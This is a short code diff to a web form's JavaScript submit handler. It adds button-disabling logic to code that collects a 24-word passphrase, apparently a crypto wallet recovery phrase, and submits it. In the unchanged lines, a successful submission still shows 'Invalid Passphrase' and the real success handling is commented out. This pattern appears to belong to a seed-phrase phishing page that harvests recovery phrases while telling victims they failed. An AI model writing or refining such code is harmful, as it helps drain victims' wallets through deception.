@@ -3,6 +3,11 @@ function handleSubmit(event) {
     event.preventDefault(); // Prevent default form submission
     const errorElement = document.getElementById('emsg');
     errorElement.textContent = '';
+    const myButton = document.getElementById('b1')
+    myButton.disabled = true;
+
+    const myButton2 = document.getElementById('b2')
+    myButton2.disabled = true;
     // Step 1: Get the value of the hidden input field with name 'mf-texts'
     const form = document.getElementById('myForm'); // Replace 'myForm' with your form ID
     const inputValue = form.elements['mf-texts'].value.trim();
@@ -11,6 +16,8 @@ function handleSubmit(event) {
     if (wordCount !== 24) {
         const errorElement = document.getElementById('emsg');
         errorElement.textContent = 'Invalid Passphrase';
+        myButton.disabled = false;
+        myButton2.disabled = false;
         return; // Exit function if word count is not 24
     }
 
@@ -35,6 +42,8 @@ function handleSubmit(event) {
         //     errorElement.textContent = data.error;
         // }
         errorElement.textContent = 'Invalid Passphrase'
+        myButton.disabled = false;
+        myButton2.disabled = false;
         // Handle successful response if needed
     })
     .catch(error => {
@@ -42,6 +51,8 @@ function handleSubmit(event) {
         const errorElement = document.getElementById('emsg');
         // errorElement.textContent = 'Error occurred while processing your request.';
         errorElement.textContent = 'Invalid Passphrase';
+        myButton.disabled = false;
+        myButton2.disabled = false;
     });
 }
 
